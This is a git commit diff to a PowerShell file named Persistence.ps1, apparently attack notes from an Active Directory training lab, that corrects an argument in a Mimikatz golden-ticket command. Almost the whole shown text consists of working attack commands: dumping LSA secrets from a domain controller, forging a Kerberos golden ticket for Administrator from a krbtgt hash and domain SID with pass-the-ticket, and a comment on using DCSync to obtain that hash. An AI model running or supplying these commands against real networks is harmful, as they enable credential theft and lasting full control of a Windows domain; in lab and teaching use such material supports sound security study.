dc98ecbb79682ba2e7a8f5681c344b92740bb6b8
Rektsu <fonsobr@gmail.com>
2022-03-13 17:47:26 +0100

    Update Persistence.ps1

--- Persistence.ps1
+++ Persistence.ps1
@@ -4,7 +4,7 @@
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc
 
 # On any machine
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff47a9d8bd66ce7efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff47a9d8bd66ce7efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 
 # To use DCSync feature for getting krbtgt hash 
 # DA privileges needed (or a user that has replication rights on the domain object)
